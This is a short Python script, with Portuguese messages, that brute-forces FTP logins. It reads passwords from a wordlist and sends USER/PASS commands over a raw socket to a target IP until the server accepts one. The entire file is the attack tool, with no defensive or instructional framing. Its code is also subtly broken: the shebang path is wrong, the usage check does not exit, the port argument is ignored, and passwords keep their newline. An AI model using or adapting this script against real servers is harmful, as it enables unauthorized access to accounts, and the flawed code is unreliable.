#!/usr/share/python3

import socket, sys

if len(sys.argv) < 4 or len(sys.argv) > 5:

	print("Modo de uso:")
	print("python3 script.py <ip> <user> <wordlist> [port (default 21)]")

ip = sys.argv[1]

user = sys.argv[2]

keys = open(sys.argv[3],'r')

port = int(sys.argv[4])

for key in keys:

	print("Tentando {}:{}".format(user,key.strip('\n')))

	tcp = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

	tcp.connect((ip,21))

	tcp.recv(1024)

	tcp.send("USER {}\r\n".format(user).encode())

	tcp.recv(1024)

	tcp.send("PASS {}\r\n".format(key).encode())

	res = int(tcp.recv(1024).decode().split(' ')[0])

	if res == 230:
		print("Senha {} encontrada".format(key.strip('\n')))
		sys.exit(0)
	tcp.close()
